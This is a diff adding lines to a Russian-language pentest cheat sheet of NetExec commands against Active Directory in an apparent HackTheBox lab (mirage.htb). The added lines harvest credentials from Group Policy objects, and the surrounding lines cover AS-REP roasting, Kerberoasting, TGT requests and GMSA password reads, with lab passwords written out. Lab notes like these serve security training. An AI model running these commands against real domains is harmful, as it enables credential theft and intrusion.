@@ -76,6 +76,10 @@
   		(asreproasting)	nxc ldap -u users.txt -d mirage.htb -k --asreproast asreprotuser.txt dc01.mirage.htb
 		(керберостинг с nxc) nxc ldap -u david.jjackson -p 'pN8kQmn6b86!1234@' -d mirage.htb -k --kerberoasting kerberoastables.txt dc01.mirage.htb
 
+		(Поиск учетных записей в объектах групповой политики)
+		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_autologin 
+		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_password
+		
   		(получение tgt) nxc smb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k --generate-tgt nathan.aadam dc01.mirage.htb
 		(чтение GMSA)  nxc ldap -u javier.mmarshall -p 'Password123' -k --gmsa dc01.mirage.htb
 		
